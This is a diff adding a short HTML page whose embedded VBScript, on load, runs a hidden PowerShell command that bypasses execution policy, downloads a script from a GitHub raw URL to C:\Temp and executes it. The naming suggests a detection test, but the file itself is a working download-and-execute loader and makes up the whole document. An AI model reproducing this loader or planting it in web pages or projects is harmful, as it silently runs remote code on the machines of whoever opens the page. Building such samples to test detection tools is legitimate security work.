@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Run PowerShell Script</title>
+    <script type="text/vbscript">
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/acham09/TestCase/main/DetectionTest_OpenWebpage.ps1' -OutFile 'C:\\Temp\\DetectionTest_OpenWebpage.ps1'; & 'C:\\Temp\\DetectionTest_OpenWebpage.ps1'\"", 0, True
+    </script>
+</head>
+<body>
+    <h1>Running PowerShell Script...</h1>
+</body>
+</html>
